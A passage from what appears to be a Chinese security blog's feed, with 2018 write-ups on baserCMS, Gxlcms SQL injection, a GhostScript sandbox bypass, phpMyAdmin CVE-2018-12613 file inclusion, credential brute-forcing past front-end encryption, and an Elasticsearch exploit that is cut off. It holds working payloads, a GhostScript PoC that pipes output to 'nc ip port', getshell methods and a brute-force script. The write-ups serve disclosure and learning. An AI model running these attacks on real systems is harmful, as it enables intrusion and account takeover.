rel="external">http://127.0.0.1/basercms/files/theme_configs/logo.php</a><br>Command execution:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-11.png" alt="图11"></p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h4><p>Whitelist restrictions on upload file suffixes such as (jpg, png, gif, jpeg etc.)<br>Note: The issue has been reported in 2018 09 and was resolved by a developer of baserCMS. <a href="https://basercms.net/news/archives/574" target="_blank" rel="external">Announcement address</a></p><h3 id="Vulnerability-information-page"><a href="#Vulnerability-information-page" class="headerlink" title="Vulnerability information page:"></a>Vulnerability information page:</h3><p><a href="https://basercms.net/security/CVE-2018-18942_CVE-2018-18943" target="_blank" rel="external">https://basercms.net/security/CVE-2018-18942_CVE-2018-18943</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h3&gt;&lt;p&gt;baserCMS（ベーサーシーエムエス）とは、直感的な操作と高いメンテナンス性を実現し、Webサイトを自由にカスタマイズできる国産CMS（コンテンツ・マネージメント・システム）です。日本人が日本人の為に、みんなで作っているオープンソース・ソフトウェアです。無料で利用でき、様々なサーバーで動作可能で、インストールも簡単です。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="baserCMS" scheme="http://sunu11.com/tags/baserCMS/"/>
    
      <category term="漏洞披漏" scheme="http://sunu11.com/tags/%E6%BC%8F%E6%B4%9E%E6%8A%AB%E6%BC%8F/"/>
    
      <category term="代码审计" scheme="http://sunu11.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>glxcms漏洞披漏</title>
    <link href="http://sunu11.com/2018/10/18/glxcms/"/>
    <id>http://sunu11.com/2018/10/18/glxcms/</id>
    <published>2018-10-18T09:56:39.000Z</published>
    <updated>2018-11-03T12:01:48.674Z</updated>
    
    <content type="html"><![CDATA[<h3 id="cms简介"><a href="#cms简介" class="headerlink" title="cms简介"></a>cms简介</h3><p>Gxlcms新闻系统是一个以php+mysql进行开发的新闻类cms内容管理系统。<br>Gxlcms新闻系统的优势：前台与后台采用隔离方式，模板化设计，<a id="more"></a>让只要你会前端就可以做一个新闻网站！后台设计简单明了，小白用户一看就会明白！程序功能也非常完善！<br>1.目前程序支持三种路由模式：静态生成，伪静态，动态；<br>2.支持两种存储模式：本地存储，FTP存储<br>3.接入百度主动推送功能！让你每篇新闻/资讯都可以及时被百度发现<br>4.图片水印功能：只要开启图片水印，不管是标图图片或者是内容图片统统添加水印，水印功能支持9宫格设计，让你可以随意把图片水印加到任意地方<br>5.数据库一键备份/还原，让你可以轻松的把网站迁移到任何服务器上<br>6.缓存功能：模板缓存，数据库缓存，网站页面缓存<br>7.友情链接：支持图片链接和文字链接<br>8.广告模块：只要后台添加广告后，全部js生成到前台，让你不用费事修改模板<br>9.采集功能，我们支持火车头采集，火车头接口已经在插件中心里面，只需要你下载后，就可以采集上万新闻内容，为了防止重名新闻，我们对接口做了细腻化的功能，支持入库重名判断，当有重名新闻自动过滤<br>10.扩展功能：扩展性，可以在插件中心下载，招聘模块，图集模块，会员中心模块，交友模块等等模块进行安装（开发中）<br><a href="https://gitee.com/gxlcms/Gxlcmsv2.0-20180915" target="_blank" rel="external">源码下载地址:</a><br><a href="http://news.gxlcms.com/" target="_blank" rel="external">Demo地址：</a><br>官网更新补丁链接：待补充</p><h3 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h3><h4 id="1、后台sql注入漏洞-CVE-2018-18488"><a href="#1、后台sql注入漏洞-CVE-2018-18488" class="headerlink" title="1、后台sql注入漏洞(CVE-2018-18488)"></a>1、后台sql注入漏洞(CVE-2018-18488)</h4><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>从\lib\admin\action\dataaction.class.php文件中处理数据库备份方法可知：<br>$table是从$_POST[‘ids’]中传入，且可控。然后，在32行代码中与TRUNCATE TABLE 拼接存入sql文件，然后在后续导入还原功能中执行，因此我们可以控制生成的sql文件，并且执行任意sql语句。<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-1.png" alt="图1"><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-2.png" alt="图2"><br>构造sql注入语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ids%5B%5D=gxl_actor`;</div><div class="line">select sleep(3);--%20</div></pre></td></tr></table></figure></p><p>我们发送数据包后，生成的sql文件如下所示：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-3.png" alt="图3"><br>然后在进行备份还原：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-4.png" alt="图4"><br>可看到延迟，我们注入select sleep(1)后通过sql备份还原功能执行sql文件：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-5.png" alt="图5"><br>因此判断存在注入。</p><h5 id="修复建议："><a href="#修复建议：" class="headerlink" title="修复建议："></a>修复建议：</h5><p>对ids参数值进行过滤</p><h4 id="2、前台任意sql备份文件下载：-CVE-2018-18487"><a href="#2、前台任意sql备份文件下载：-CVE-2018-18487" class="headerlink" title="2、前台任意sql备份文件下载：(CVE-2018-18487)"></a>2、前台任意sql备份文件下载：(CVE-2018-18487)</h4><h5 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>从\lib\admin\action\dataaction.class.php文件中处理数据库备份方法可知生成备份文件的方法如下：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-6.png" alt="图6"><br>看到<code>mt_rand</code>函数：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-7.png" alt="php官网"><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-8.png" alt="先知社区"></p><p>然后结合cms的sql文件生成代码:<br><code>Sql文件名字：年月日_随机数_1.sql</code></p><p>通过随机数值来爆破种子的过程，外国朋友写了一个工具：php_mt_seed（官方使用说明：<a href="http://www.openwall.com/php_mt_seed/README" target="_blank" rel="external">http://www.openwall.com/php_mt_seed/README</a> ）。使用工具获得随机数，拼接sql文件名称。<br>然后在管理员未修改源码目录的情况下访问默认路径即可未授权下载备份的sql文件：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-9.png" alt="图9"></p><h5 id="修复建议：-1"><a href="#修复建议：-1" class="headerlink" title="修复建议："></a>修复建议：</h5><p>可参考phpcms小于V9.6.2 authkey泄露的修复方式在每次生成随机数之前都手动播种一次，<br>或者采用时间戳的方式。</p><p>参考链接：<a href="https://xz.aliyun.com/t/31" target="_blank" rel="external">https://xz.aliyun.com/t/31</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;cms简介&quot;&gt;&lt;a href=&quot;#cms简介&quot; class=&quot;headerlink&quot; title=&quot;cms简介&quot;&gt;&lt;/a&gt;cms简介&lt;/h3&gt;&lt;p&gt;Gxlcms新闻系统是一个以php+mysql进行开发的新闻类cms内容管理系统。&lt;br&gt;Gxlcms新闻系统的优势：前台与后台采用隔离方式，模板化设计，
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="漏洞披漏" scheme="http://sunu11.com/tags/%E6%BC%8F%E6%B4%9E%E6%8A%AB%E6%BC%8F/"/>
    
      <category term="代码审计" scheme="http://sunu11.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="glxcms" scheme="http://sunu11.com/tags/glxcms/"/>
    
  </entry>
  
  <entry>
    <title>GhostScript沙箱绕过</title>
    <link href="http://sunu11.com/2018/08/23/23/"/>
    <id>http://sunu11.com/2018/08/23/23/</id>
    <published>2018-08-23T04:41:35.000Z</published>
    <updated>2018-11-03T12:00:48.494Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-1.png" alt="23-1"></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 ghostscript 的安全沙箱可以被绕过，通过构造恶意的图片内容，可造成命令执行。<a id="more"></a><br>ghostscript应用广泛，ImageMagick、python-matplotlib、libmagick 等图像处理应用均有引用。<br>在ghostscript中由于以往的安全事件，针对安全问题gs官方采用增加参数-dSAFER来开启安全沙箱，但该沙箱在程序执行过程中由LockSafetyParams这个值进行控制，此次Taviso发现通过restore操作会将该值成功覆盖，导致安全沙箱被绕过，引发命令执行漏洞。</p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><h3 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h3><p>vps开启监听端口后，对图片上传功能进行测试，上传含有攻击数据的图片：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-3.png" alt="23-3"></p><p>服务器收到回显：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-4.png" alt="23-4"></p><h3 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">%!PS</div><div class="line">userdict /setpagedevice undef</div><div class="line">save</div><div class="line">legal</div><div class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</div><div class="line">&#123; legal &#125; stopped &#123; pop &#125; if</div><div class="line">restore</div><div class="line">mark /OutputFile (%pipe%whoami|nc ip port) currentdevice putdeviceprops</div></pre></td></tr></table></figure><h2 id="漏洞影响："><a href="#漏洞影响：" class="headerlink" title="漏洞影响："></a>漏洞影响：</h2><p>version &lt;= 9.23（全版本、全平台）<br>所有引用ghostscript的上游应用如：<br>imagemagick<br>libmagick<br>graphicsmagick<br>gimp<br>python-matplotlib<br>texlive-core<br>texmacs<br>latex2html<br>latex2rtf<br>等</p><h2 id="缓解措施："><a href="#缓解措施：" class="headerlink" title="缓解措施："></a>缓解措施：</h2><p>1、卸载ghostscript。<br>2、使用ImageMagick，建议修改policy文件。<br>（默认位置：/etc/ImageMagick/policy.xml），在 <policymap> 中加入以下 <policy>（即禁用 PS、EPS、PDF、XPS coders）<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-2.png" alt="23-2"> </policy></policymap></p><h2 id="参考信息："><a href="#参考信息：" class="headerlink" title="参考信息："></a>参考信息：</h2><p>1、漏洞分析：<br><a href="https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247485615&amp;idx=1&amp;sn=b25c47324b771266c0d62cb46c263f42&amp;chksm=fe250daec95284b81a882aeecf36a50e39d8fb7e7e82ac4affd16b7f60ddb6741c99aeb851b3&amp;scene=21#wechat_redirect" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247485615&amp;idx=1&amp;sn=b25c47324b771266c0d62cb46c263f42&amp;chksm=fe250daec95284b81a882aeecf36a50e39d8fb7e7e82ac4affd16b7f60ddb6741c99aeb851b3&amp;scene=21#wechat_redirect</a><br>2、邮件列表：<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640" target="_blank" rel="external">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://n-b.oss-cn-beijing.aliyuncs.com/23-1.png&quot; alt=&quot;23-1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 ghostscript 的安全沙箱可以被绕过，通过构造恶意的图片内容，可造成命令执行。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="命令执行" scheme="http://sunu11.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="GhostScript" scheme="http://sunu11.com/tags/GhostScript/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-12613漏洞学习总结</title>
    <link href="http://sunu11.com/2018/07/25/22/"/>
    <id>http://sunu11.com/2018/07/25/22/</id>
    <published>2018-07-25T07:10:45.000Z</published>
    <updated>2018-11-03T12:03:13.090Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>在漏洞披漏之后，就对该漏洞进行了分析复现，本来打算投freebuf，谁知道被抢了先2333，贴图留念～～～<a id="more"></a><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-1.png" alt="22-1"></p><h4 id="CVE-2018-12613："><a href="#CVE-2018-12613：" class="headerlink" title="CVE-2018-12613："></a>CVE-2018-12613：</h4><p>2018年6月19日，phpMyAdmin在最新版本修复了一个严重级别的漏洞。攻击者必须拥有后台权限，phpMyAdmin4.8.0和4.8.1均受漏洞影响。</p><h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><blockquote><p>首先在如下图所示的index.php中存在一处包含指定文件的代码：</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-2.png" alt="22-2"></p><blockquote><p>需要成功包含，必须满足if区间中的五个条件：target参数值不为空；target参数值为字符串；target参数值不以index开头；target参数值不在黑名单中；过checkPageValidity函数的检查。其中第四个条件的黑名单即51行中import.php与export.php；第五个条件需要查看该函数：</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-3.png" alt="22-3"></p><blockquote><p>可以看到core类的checkPageValidity函数中又必须经过以下的五个判断：<br>1、$whitelist为空就引用申明的$goto_whitelist<br>2、$page如果没有定义或者$page不为字符串就返回false<br>3、$page如果存在在$whitelist中返回true<br>4、如果$_page存在在$whitelist中返回true<br>5、经过urldecode函数解码后的$_page存在在$whitelist中返回true<br>我们可以看到在index.php调用checkPageValidity函数时没有传入其他参数，因此会进入第一个判断，而$goto_whitelist如下所示：</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-4.png" alt="22-4"></p><blockquote><p>它定义了很多可以被包含的文件名。然后第二个判断可以跳过；看第三个判断，可以看到$page参数是不在$whitelist中的，此处不满足；看第四个判断，这个判断是对$_page进行的，校验$_page是否在白名单中，而$_page是将$page值末尾加上’?’后从字符串第0位开始分割，取其中第一次出现?之前的内容，如下图所示：<br>target=sql.ph%3fp时：</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-5.png" alt="22-5"></p><blockquote><p>因此此处可以用’$target=db_sql.php?/../../被包含文件’来满足条件，但是$target进入到index.php的include()中，被包含的文件无法打开，出现报错。（windows文件命名规则中规定了文件名不能出现特殊字符，linux为服务器的情况下，是可以使用？直接进行绕过）</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-6.png" alt="22-6"></p><blockquote><p>第五个判断，先将$page进行urldecode解码，然后再进行？的分割，取值进行判断，只要解码后分割出来的值在$whitelist中即可满足条件。而在$target 里问号被二次编码为%253f， db_sql.php%253f也会被认为是一个目录，可以用../跨越，成功实现包含。因此命名规范里面没有将%放进去也是该漏洞能在windows下成功利用的一个关键点。</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-7.png" alt="22-7"></p><blockquote><p>这样我们可以将？进行二次编码。如果传入target=db_sql.php%253f。在第四个判断中进行白名单校验时，为db_sql.php%3f，不满足，第五个判断的urldecode后，进行校验时为db_sql.php,符合条件，然后即可成功包含文件。</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-8.png" alt="22-8"></p><h4 id="复现心得："><a href="#复现心得：" class="headerlink" title="复现心得："></a>复现心得：</h4><p>getshell方式</p><p>1、上传sql文件，然后进行包含。<br>2、开启webshell日志功能，查询webshell语句后，包含日志。<br>3、将webshell写入字段中，如果数据库在本地，可以直接通过查询数据库文件位置：select @@datadir；然后得到数据库文件存放路径，而字段内容则在数据库名/表名.frm中</p><p>说明图1：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-9.png" alt="22-9"></p><p>说明图2：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-10.png" alt="22-10"></p><p>4、通过phpsession文件包含，首先执行查找webshell的语句，然后在cookie中的phpmyadmin参数中可看到session文件名。<br>说明图1：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-11.png" alt="22-11"></p><p>说明图2<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-12.png" alt="22-12"></p><p>getshell方式：<br>        目前官方已修复漏洞，更新至最新版本可不受此漏洞影响。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;p&gt;在漏洞披漏之后，就对该漏洞进行了分析复现，本来打算投freebuf，谁知道被抢了先2333，贴图留念～～～
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="phpmyadmin" scheme="http://sunu11.com/tags/phpmyadmin/"/>
    
      <category term="漏洞总结" scheme="http://sunu11.com/tags/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
      <category term="CVE-2018-12613" scheme="http://sunu11.com/tags/CVE-2018-12613/"/>
    
  </entry>
  
  <entry>
    <title>如何对经前端加密后的数据进行爆破</title>
    <link href="http://sunu11.com/2018/07/23/21/"/>
    <id>http://sunu11.com/2018/07/23/21/</id>
    <published>2018-07-23T07:50:45.000Z</published>
    <updated>2018-11-03T12:03:20.123Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-1-简述："><a href="#1-1-简述：" class="headerlink" title="1.1 简述："></a>1.1 简述：</h2><p>最近遇到两个个案例，经过一番倒腾，发现其登录功能均可撞库。但是都存在登录数据本地加密，有空了放一起总结记录一下。<a id="more"></a></p><h2 id="2-1-案例1-RSA本地加密"><a href="#2-1-案例1-RSA本地加密" class="headerlink" title="2.1 案例1(RSA本地加密):"></a>2.1 案例1(RSA本地加密):</h2><h3 id="2-1-1-摸底："><a href="#2-1-1-摸底：" class="headerlink" title="2.1.1 摸底："></a>2.1.1 摸底：</h3><blockquote><p>首先，进行正常登录逻辑测试，发现该系统登录逻辑分下面两步：<br>1、输入正确用户名密码，校验正确后，向注册手机号发送验证码。<br>2、输入正确验证码，登录系统。</p></blockquote><p>从该逻辑可知此处可通过填写登录用户名密码后是否发送验证码来判断输入数据是否为正确用户登录凭证，由于站点未对获取验证码提交频率作任何限制，从而可自动化提交来获取该站点正确用户名密码。</p><h3 id="2-1-2-演习："><a href="#2-1-2-演习：" class="headerlink" title="2.1.2 演习："></a>2.1.2 演习：</h3><blockquote><p>在google的过程中，很快的找到了一款burpsuite套件：jsEncrypter（感谢作者提供这么利索的插件）。下载地址：<a href="https://github.com/c0ny1/jsEncrypter/releases。" target="_blank" rel="external">https://github.com/c0ny1/jsEncrypter/releases。</a><br>安装完成后，我们将jsencrypt.min.js下载至本地。然后对站点系统前端代码进行调试，分析前端处理过程，编写js模板文件。</p></blockquote><p>对登录过程进行调试：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-1.png" alt="21-1"></p><blockquote><p>在审计前端源代码页面中，可以找到，在ui目录下的lib文件夹下有一个security文件夹，而其中的rsa_util.js就是调用jsencrypt.min.js文件种的JSEncrypt方法对用户名密码进行加密。</p></blockquote><p>下图为动态调试结果：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-2.png" alt="21-2"></p><blockquote><p>我们可以很清楚看到加密过程，然后根据jsEncrypter的readme文档中的使用指南，我们可以根据其调用逻辑，自行编写一个jsEncrypter_rsa.js文件，来调用jsencrypt.min.js文件为我们的明文数据进行加密。</p></blockquote><p>这里有两个小坑：</p><blockquote><p>1、由动态调试可知，公钥_pubk在cookie中以url编码后的方式存储，因此，我们本地调用，需要解码一下，在这里，对于换行符，需要用\n替换。<br>2、由于jsEncrypter插件使用了phantomjs平台，而phantomjs支持url解码的函数为encodeURIComponent。因此不能使用与系统前端一致的encodeURI函数。</p></blockquote><p>然后仿写系统加密的方式，将公钥以及调用逻辑写入到我们自己的js文件中：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-3.png" alt="21-3"></p><h3 id="2-1-3-攻击："><a href="#2-1-3-攻击：" class="headerlink" title="2.1.3 攻击："></a>2.1.3 攻击：</h3><p>1、运行phantomJS并测试</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-4.png" alt="21-4"></p><p>2、Burpsuite验证，调用成功：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-5.png" alt="21-5"></p><p>3、抓包，加载字典，实施爆破：（两个参数的字典都使用插件）</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-6.png" alt="21-6"></p><p>然后，成功爆破:</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-7.png" alt="21-7"></p><h2 id="2-2-案例2-md5本地加密"><a href="#2-2-案例2-md5本地加密" class="headerlink" title="2.2 案例2(md5本地加密):"></a>2.2 案例2(md5本地加密):</h2><h3 id="2-2-1-摸底："><a href="#2-2-1-摸底：" class="headerlink" title="2.2.1 摸底："></a>2.2.1 摸底：</h3><blockquote><p>首先通过分析用户登录过程，发现该站点登录无验证码，可多次提交登录数据，但是其用户名密码在本地进行了md5加密处理。因此，撞库之前需要本地实现将字典进行加密操作后再提交。<br>对登录功能抓包分析后，可以看到在填写用户名密码后，前端发送如下数据包获取cd、salt数据包：</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-8.png" alt="21-8"></p><p>此处存在salt泄漏风险，可遍历手机号，对于未注册⽤用户，返回值⽆salt，对于已注册⽤户salt值恒定。<br>而实施撞库，需要先请求得到salt与cd值。</p><p>然后可从前端代码中得到加密用户名密码过程：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-9.png" alt="21-9"></p><p>pass经过本地md5加密后， 发送至服务端进行登录校验。</p><h3 id="2-2-2-演习："><a href="#2-2-2-演习：" class="headerlink" title="2.2.2 演习："></a>2.2.2 演习：</h3><p>因此，我们只需要用脚本，先输入用户名即手机号，请求得到cd、salt值，然后再从密码字典中，取出密码进行md5加密，最后发包请求即可。编写python脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">#-*- coding=utf-8 -*-</div><div class="line"></div><div class="line">import requests</div><div class="line">import hashlib</div><div class="line">import json</div><div class="line"></div><div class="line"></div><div class="line">def GetPass():</div><div class="line">fp = open(&quot;./pass.txt&quot;,&quot;r&quot;)</div><div class="line">if fp == 0:</div><div class="line">print (&quot;open file error!&quot;)</div><div class="line">return;</div><div class="line">while 1:</div><div class="line">line = fp.readline()</div><div class="line">if not line:</div><div class="line">break</div><div class="line">passwd = line.strip(&apos;\n&apos;)</div><div class="line">Brute_Force_Dididai(&quot;150****1403&quot;,passwd);</div><div class="line"></div><div class="line">def Brute_Force_Dididai(username,password):</div><div class="line"></div><div class="line"># url = &quot;&quot;</div><div class="line">    s = requests.Session()</div><div class="line">s.headers = &#123;</div><div class="line">            &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/51.0.2704.103 Safari/537.36&apos;,</div><div class="line">            &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">url = &quot;http://www.foo.com/?m=&amp;s=getcd&quot;</div><div class="line">data = &#123;&quot;username&quot;:username&#125;</div><div class="line"></div><div class="line">html = s.post(url,data = data)</div><div class="line"></div><div class="line">print html.content</div><div class="line">salt_cd = json.loads(html.content)</div><div class="line">print salt_cd[&apos;salt&apos;]</div><div class="line">print salt_cd[&apos;cd&apos;]</div><div class="line">md5_pass = hashlib.md5(password.encode(&apos;utf-8&apos;)).hexdigest()+salt_cd[&apos;salt&apos;]</div><div class="line">md5_salt = hashlib.md5(md5_pass.encode(&apos;utf-8&apos;)).hexdigest()+str(salt_cd[&apos;cd&apos;])</div><div class="line">md5_cd = hashlib.md5(md5_salt.encode(&apos;utf-8&apos;)).hexdigest()</div><div class="line">print md5_cd</div><div class="line"></div><div class="line">url1 = &quot;http://www.foo.com/?m=&amp;s=login_wd&amp;ismd5=1&quot;</div><div class="line">data1 = &#123;&quot;username&quot;:&quot;username&quot;,&quot;password&quot;:md5_cd&#125;</div><div class="line">html1 = s.post(url1,data = data1)</div><div class="line">print html1.content</div><div class="line">print len(html1.content);</div><div class="line"></div><div class="line">GetPass()</div></pre></td></tr></table></figure><p>然后准备测试pass.txt:</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-10.png" alt="21-10"></p><h3 id="2-2-3-攻击："><a href="#2-2-3-攻击：" class="headerlink" title="2.2.3 攻击："></a>2.2.3 攻击：</h3><p>最后只需要执行脚本即可：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-11.png" alt="21-11"></p><p>最后是爆破成功返回到数据包，由此可得到正确用户名密码。<br>freebuf地址<a href="http://www.freebuf.com/articles/web/184455.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/184455.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-1-简述：&quot;&gt;&lt;a href=&quot;#1-1-简述：&quot; class=&quot;headerlink&quot; title=&quot;1.1 简述：&quot;&gt;&lt;/a&gt;1.1 简述：&lt;/h2&gt;&lt;p&gt;最近遇到两个个案例，经过一番倒腾，发现其登录功能均可撞库。但是都存在登录数据本地加密，有空了放一起总结记录一下。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="爆破" scheme="http://sunu11.com/tags/%E7%88%86%E7%A0%B4/"/>
    
      <category term="js加密" scheme="http://sunu11.com/tags/js%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Elsaticsearch 漏洞小结</title>
    <link href="http://sunu11.com/2018/07/14/20/"/>
    <id>http://sunu11.com/2018/07/14/20/</id>
    <published>2018-07-13T16:06:05.000Z</published>
    <updated>2018-11-03T11:59:40.047Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-因"><a href="#0-因" class="headerlink" title="0.因"></a>0.因</h3><p>众测过程中遇到了Elsaticsearch未授权访问的情况，搞完发现又把时间浪费在了查各种资料上，<a id="more"></a>故小记一番。</p><h3 id="1-果"><a href="#1-果" class="headerlink" title="1.果"></a>1.果</h3><h4 id="1-1-CVE-2014-3120-elasticsearch-v1-1-1-–-命令执行漏洞"><a href="#1-1-CVE-2014-3120-elasticsearch-v1-1-1-–-命令执行漏洞" class="headerlink" title="1.1 (CVE-2014-3120)elasticsearch v1.1.1 – 命令执行漏洞"></a>1.1 (CVE-2014-3120)elasticsearch v1.1.1 – 命令执行漏洞</h4><h5 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h5><p>1、创建数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">posturl: http://ip:9200/foo/foo2</div><div class="line"></div><div class="line">postdata：</div><div class="line"></div><div class="line">&#123;</div><div class="line">  &quot;name&quot;: &quot;data&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>2、执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">posturl: http://ip:9200/_search?pretty </div><div class="line"></div><div class="line">postdata:</div><div class="line">&#123;</div><div class="line">    &quot;size&quot;: 1,</div><div class="line">    